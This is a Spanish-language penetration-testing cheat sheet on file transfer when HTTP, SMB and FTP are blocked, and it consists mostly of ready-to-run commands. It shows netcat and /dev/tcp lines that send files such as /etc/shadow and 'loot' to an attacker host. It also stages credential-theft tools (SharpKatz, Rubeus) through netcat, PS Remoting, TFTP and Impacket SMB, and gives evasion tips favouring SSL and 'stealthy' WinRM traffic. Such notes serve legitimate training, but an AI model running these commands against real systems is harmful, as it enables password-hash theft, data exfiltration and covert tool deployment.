# Métodos Misceláneos de Transferencia de Archivos

Métodos alternativos para cuando los canales HTTP, SMB y FTP están bloqueados o monitorizados.

### Netcat y Ncat

Netcat es la "navaja suiza" de las redes. Puede transferir archivos sin necesidad de ningún servidor adicional.

#### Netcat — Descarga en el objetivo

```bash
# En el atacante — enviar el archivo (el atacante conecta al objetivo)
nc -q 0 192.168.1.50 8000 < SharpKatz.exe

# En el objetivo — recibir escuchando
nc -lvnp 8000 > SharpKatz.exe
```

#### Netcat — Subida desde el objetivo

```bash
# En el atacante — escuchar y recibir
nc -lvnp 8000 > loot.zip

# En el objetivo — enviar
nc -q 0 192.168.1.100 8000 < /etc/shadow
```

#### Ncat (versión mejorada incluida en Nmap)

Ncat soporta cifrado SSL, lo que evita que el contenido sea visible en capturas de red.

```bash
# En el atacante — recibir con SSL
ncat -lvnp 8000 --recv-only > SharpKatz.exe

# En el objetivo — enviar con SSL
ncat --send-only 192.168.1.100 8000 --ssl < SharpKatz.exe
```

#### Cuando Netcat no está disponible — /dev/tcp

```bash
# En el atacante — escuchar con nc
nc -lvnp 8000 > archivo.exe

# En el objetivo — enviar con bash
cat archivo.exe > /dev/tcp/192.168.1.100/8000
```

### PowerShell Session (PS Remoting)

En entornos Windows donde WinRM está activo y SMB/HTTP están bloqueados, se puede usar una sesión PowerShell remota para transferir archivos.

```powershell
# En el atacante — crear sesión remota (requiere credenciales o kerberos)
$session = New-PSSession -ComputerName 192.168.1.50 -Credential (Get-Credential)

# Copiar archivo al sistema remoto
Copy-Item -Path C:\Herramientas\Rubeus.exe -ToSession $session -Destination "C:\Users\Public\"

# Copiar archivo desde el sistema remoto
Copy-Item -Path C:\Users\Public\loot.txt -FromSession $session -Destination C:\loot.txt
```

### RDP

Si hay acceso RDP al objetivo, se puede montar la unidad local del atacante para copiar archivos directamente.

```bash
# Desde Linux — conectar con xfreerdp montando el directorio local
xfreerdp /v:192.168.1.50 /u:usuario /p:contraseña /drive:linux,/tmp
```

Una vez dentro de la sesión RDP, el directorio local aparece en "Este equipo" como `\\tsclient\linux` y se puede copiar/pegar directamente.

### TFTP (Trivial FTP)

TFTP opera sobre UDP/69 y no requiere autenticación. Útil en dispositivos de red y sistemas legacy que no tienen FTP ni HTTP disponibles.

```bash
# En el atacante — instalar y configurar servidor TFTP
sudo apt install atftpd
mkdir /tftp && chmod 777 /tftp
sudo atftpd --daemon --port 69 /tftp

# En Windows — descargar con cliente TFTP nativo
tftp -i 192.168.1.100 get nc.exe
```

> TFTP no está disponible en Windows 7+ por defecto. Puede habilitarse desde "Activar o desactivar características de Windows" o con `dism /online /Enable-Feature /FeatureName:TFTP`.

### Impacket SMB Server

Útil cuando se quiere un share SMB completamente controlado desde Linux.

```bash
# Share sin autenticación
sudo impacket-smbserver share -smb2support /tmp/archivos

# Share con usuario/contraseña (para Windows modernos)
sudo impacket-smbserver share -smb2support /tmp/archivos -user pentest -password pentest123

# En Windows — copiar desde el share
copy \\192.168.1.100\share\nc.exe
net use n: \\192.168.1.100\share /user:pentest pentest123
copy n:\Rubeus.exe
```

### Referencia rápida

| Método       | Protocolo    | Windows     | Linux         | Cifrado |
| ------------ | ------------ | ----------- | ------------- | ------- |
| Netcat       | TCP          | Sí          | Sí            | No      |
| Ncat         | TCP+SSL      | Sí          | Sí            | Sí      |
| PS Remoting  | WinRM (5985) | Sí          | No            | Sí      |
| RDP + Drive  | RDP (3389)   | Sí          | Sí (xfreerdp) | Sí      |
| TFTP         | UDP 69       | Sí (manual) | Sí            | No      |
| Impacket SMB | TCP 445      | Sí          | Sí (servidor) | No      |

> **PS Remoting** es uno de los métodos más sigilosos en entornos Windows porque usa WinRM que es tráfico de administración legítimo, cifrado y habitualmente permitido entre sistemas del dominio.
